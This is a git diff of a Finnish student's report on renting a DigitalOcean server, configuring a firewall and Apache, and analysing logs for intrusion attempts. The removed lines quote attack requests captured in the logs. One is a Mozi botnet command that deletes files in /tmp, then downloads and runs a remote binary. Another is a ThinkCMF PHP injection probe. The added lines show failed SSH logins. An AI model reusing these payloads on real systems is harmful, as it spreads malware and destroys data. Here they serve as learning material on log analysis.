@@ -11,7 +11,7 @@
 - [x] a) Vuokraa oma julkinen palvelin Internetiin. Vinkkejä: Perustele tehdyt valinnat. Voit saada myös ilmaiseksi Github Education -paketilla. Jos sinulla on aiempi palvelin, tee uusi alusta lähtien ja raportoi samalla. Käytä aina hyviä salasanoja.
 - [x] b) Suojaa palvelin tulimuurilla. Muista ensin reikä ssh-palvelimelle.
 - [x] c) Laita koneellesi Apache-weppipalvelin. Korvaa testisivu. Laita käyttäjän kotisivut toimimaan. Kokeile eri koneelta, esim. kännykällä, että sivut toimivat. Vinkki: tee kotisivut normaalina käyttäjänä public_html/ alle, opettelemme "name based virtual hosting" myöhemmin.
-- [ ] d) Etsi lokeistasi merkkejä murtautumisyrityksistä ja analysoi ne. Vinkki: auth.log.
+- [x] d) Etsi lokeistasi merkkejä murtautumisyrityksistä ja analysoi ne. Vinkki: auth.log.
 
 
 
@@ -20,9 +20,9 @@
 
 
 
-#### a) Vuokraa oma julkinen palvelin Internetiin. Vinkkejä: Perustele tehdyt valinnat. Voit saada myös ilmaiseksi Github Education -paketilla. Jos sinulla on aiempi palvelin, tee uusi alusta lähtien ja raportoi samalla. Käytä aina hyviä salasanoja.*
+#### a) Vuokraa oma julkinen palvelin Internetiin. Vinkkejä: Perustele tehdyt valinnat. Voit saada myös ilmaiseksi Github Education -paketilla. Jos sinulla on aiempi palvelin, tee uusi alusta lähtien ja raportoi samalla. Käytä aina hyviä salasanoja.
 
-*Lähdin vuokramaan palvelinta DigitalOceanista, koska sitä suositeltiin oppitunnilla. Sain Github Education -paketilla 200 dollaria käytettäväksi kahden kuukauden ajaksi. Lähdin luomaan uutta julkista palvelinta "Create a droplet" -kohdasta. Napinpainalluksen jälkeen ilmestyi alla näkyvä sivu, josta valitsin Debian 10:nen palvelimen käyttöjärjestelmäksi. Seuraavaksi valitsin tavallisen suunnitelman, johon sisältyi tavallinen Intel prosessori SSD:n kanssa.*
+*Lähdin vuokramaan palvelinta DigitalOceanista, koska sitä suositeltiin oppitunnilla. Sain Github Education -paketilla 100 dollaria käytettäväksi kahden kuukauden ajaksi. Lähdin luomaan uutta julkista palvelinta "Create a droplet" -kohdasta. Napinpainalluksen jälkeen ilmestyi alla näkyvä sivu, josta valitsin Debian 10:nen palvelimen käyttöjärjestelmäksi. Seuraavaksi valitsin tavallisen suunnitelman, johon sisältyi tavallinen Intel prosessori SSD:n kanssa.*
 
 ![image](https://user-images.githubusercontent.com/77921212/133623762-26ad3845-e05c-4c10-ba18-40bb1e60f51a.png)
 
@@ -37,9 +37,9 @@
 \
 &nbsp;
 
-#### b) Suojaa palvelin tulimuurilla. Muista ensin reikä ssh-palvelimelle.*
+#### b) Suojaa palvelin tulimuurilla. Muista ensin reikä ssh-palvelimelle.
 
-*Hyödynsin (https://terokarvinen.com/2017/first-steps-on-a-new-virtual-private-server-an-example-on-digitalocean/?fromSearch=digital) sivulla näkyviä ohjeita. Kirjauduin palvelimelle sisään rootilla komennolla `ssh root @178.128.245.233`. Ip-osoitteen syöttämisen jälkeen tuli varmistusviesti (yes or no).*
+*Hyödynsin tässä tehtävässä Tero Karvisen sivulla<sup>1</sup> näkyviä ohjeita. Kirjauduin palvelimelle sisään rootilla komennolla `ssh root @178.128.245.233`. Ip-osoitteen syöttämisen jälkeen tuli varmistusviesti (yes or no).*
 
 ![image](https://user-images.githubusercontent.com/77921212/133629666-ab139c92-d499-4070-bf65-083af6a3f9fb.png)
 
@@ -66,7 +66,7 @@
 
 ![image](https://user-images.githubusercontent.com/77921212/133633620-31cd586b-1470-4876-b488-0be12b4c19a8.png)
 
-*Tämän jälkeen lähdin muuttamaan Apache2 oletussivun omaksi nettisivukseni. Tein viimeviikon "m)" -kohdan tapaan kopion `etc/apache2/sites-available` -kansion `000-default.conf` tiedostosta ja asetin kopion nimeksi `leinadsite.conf`. Viime viikon tapaan lisäsin ServerName ja ServerALias -kohdat, ja niihin kumpaankin palvelimneni IP-osoitteen. DocumentRoot -kohtaan laitoin jo valmiiksi kohta tekemäni public_html kansion "leinad" -käyttäjän kotihakemistoon. Directory kohtaan asetin äsken mainititun hakemiston ja sen sisälle "Require all granted" asetuksen, joka mahdollistaa palvelimen pääsyn "public_html" -hakemistoon.*
+*Tämän jälkeen lähdin muuttamaan Apache2 oletussivun omaksi nettisivukseni. Tein viime viikon "m)" -kohdan tapaan kopion `etc/apache2/sites-available` -kansion `000-default.conf` tiedostosta ja asetin kopion nimeksi `leinadsite.conf`. Viime viikon tapaan lisäsin ServerName ja ServerALias -kohdat, ja niihin kumpaankin palvelimeni IP-osoitteen. DocumentRoot -kohtaan laitoin jo valmiiksi kohta tekemäni public_html kansion "leinad" -käyttäjän kotihakemistoon. Directory -kohtaan asetin äsken mainititun hakemiston ja sen sisälle "Require all granted" asetuksen, joka mahdollistaa palvelimen pääsyn "public_html" -hakemistoon.*
 
 ![image](https://user-images.githubusercontent.com/77921212/133633857-23368a9c-2e95-4fea-b57b-46eff3cdc56a.png)
 
@@ -85,27 +85,35 @@
 &nbsp;
 
 
-#### *d) Etsi lokeistasi merkkejä murtautumisyrityksistä ja analysoi ne. Vinkki: auth.log.*
+#### d) Etsi lokeistasi merkkejä murtautumisyrityksistä ja analysoi ne. Vinkki: auth.log.
 
-> 172.104.131.24 - - [17/Sep/2021:07:51:22 +0000] "ABCDEFGHIJKLMNOPQRSTUVWXYZ9999" 400 0 "-" "-"
+*`sudo nano /var/log/auth.log` -komennolla pääsin tarkastelemaan auth.logia. Alla muutama epäilyttävä rivi kyseisestä tiedostosta.*
 
-> 61.219.11.151 - - [17/Sep/2021:04:00:04 +0000] "dN\x93\xb9\xe6\xbcl\xb6\x92\x84:\xd7\x03\xf1N\xb9\xc5;\x90\xc2\xc6\xba\xe1I-\"\xdds\xba\x1fgC:\xb1\xa7\x80+" 400 0 "-" "-"
+> Sep 19 00:43:14 valas sshd[24269]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=187.72.3.242  user=root
 
-> 45.146.164.110 - - [17/Sep/2021:04:57:59 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 269 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+*Ylläolevalta riviltä voi lukea päivämäärän ja kellonajan tarkasti. Siitä voi myös todeta, että käyttäjän kirjautumisyritys rootilla on ollut epäonnistunut. rhost -kohdasta voi lukea ip-osoitteen*
 
-> 120.86.237.41 - - [16/Sep/2021:13:27:39 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 494 "-" "Hello, world"
+> Sep 19 00:07:42 valas sshd[24161]: Did not receive identification string from 141.98.10.179 port 38066
 
-> 217.112.83.246 - - [17/Sep/2021:07:59:29 +0000] "POST /pages/createpage-entervariables.action?SpaceKey=x HTTP/1.1" 404 438 "-" "python-requests/2.18.4"
+*Ylläolevalta riviltä tulkitsin, että kyseisestä ip-osoitteesta syötetty käyttäjänimi tai salasana ovat olleet tyhjänä.*
 
-> 39.103.150.70 - - [16/Sep/2021:17:07:33 +0000] "GET /robots.txt HTTP/1.1" 404 438 "-" "fasthttp"
+> Sep 19 00:47:23 valas sshd[24396]: pam_unix(sshd:auth): check pass; user unknown
+
+*Ylläolevalta riviltä tulkitsin, että syötettyä käyttäjänimeä ei ole olemassa*
+
+> Sep 19 00:47:35 valas sshd[24405]: Invalid user nagios from 187.72.3.242 port 43281
+
+*Ylläolevalta riviltä tulkitsin, että syötettyä käyttäjänimeä "nagios" ole ole olemassa, joten pääsy-yritys tyrehtyi siihen*
 
 
 
+\
+&nbsp;
+
+
+## Lähteet:
+*- (1) https://terokarvinen.com/2017/first-steps-on-a-new-virtual-private-server-an-example-on-digitalocean/*
 
 
 
-Lähteet:
-
-- https://ipinfo.io/AS7713/180.252.0.0/16-180.252.248.0/23
-- Censys: https://techcrunch.com/2020/08/05/censys-internet-device-search-series-a/?guccounter=1&guce_referrer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS91cmw_c2E9dCZyY3Q9aiZxPSZlc3JjPXMmc291cmNlPXdlYiZjZD0mdmVkPTJhaFVLRXdpWjVjak12b2J6QWhVNkNSQUlIYmtCQ2w4UUZub0VDQjRRQVEmdXJsPWh0dHBzJTNBJTJGJTJGdGVjaGNydW5jaC5jb20lMkYyMDIwJTJGMDglMkYwNSUyRmNlbnN5cy1pbnRlcm5ldC1kZXZpY2Utc2VhcmNoLXNlcmllcy1hJTJGJnVzZz1BT3ZWYXczNmhTVDNyVFZoLXhNcldHNXl1RkxX&guce_referrer_sig=AQAAADBEvZ_FF0n92J5gOo2mrGYTm1VR1DEVNeN_vbkMc-p9hWagfhZgO8x_k7zq1I9px7afdexYv7ZwWzPXdrl8qZZD8uqc_Z98oTHHcnLR6NnxvsAiB1dgHoJE0j4lOVzeLJbUPsoR8-qKPxgOgA7Nt-hlK6Xk9xuDTQabWj1dnQQL
 
